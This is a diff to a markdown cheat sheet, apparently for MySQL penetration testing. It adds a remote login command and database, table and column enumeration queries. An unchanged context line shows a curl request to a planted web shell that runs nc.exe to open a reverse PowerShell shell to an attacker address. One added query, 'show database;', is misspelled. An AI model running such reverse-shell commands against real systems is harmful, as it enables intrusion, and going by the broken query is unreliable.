@@ -29,6 +29,7 @@ On Windows - https://www.qualitestgroup.com/resources/knowledge-center/how-to-gu
 
 ```bash
 mysql -u root -p
+mysql -u root -p'password' -h $ip  -P $port
 ```
 
 ## i7nto outfile Shell
@@ -44,18 +45,32 @@ curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+$ip+4444+-e+powershell.exe"
 ## Show Databases
 
 ```sql
-SHOW DATABASES;
+show database;
 ```
 
-## Show Users
+## Show Tables
+
+```sql
+use $database;
+SHOW tables;
+```
+
+## Show Fields from a Table  with Dot Operator
 
 ```sql
 SELECT User, Host FROM mysql.user;
 ```
 
+## Show Column names of a Table
+
+```sql
+show columns from user;
+show columns from mysql.user;
+```
+
+
 ## Execute Commands
 ```sql
-
 `\g` GO # command in mysql
 ```
 
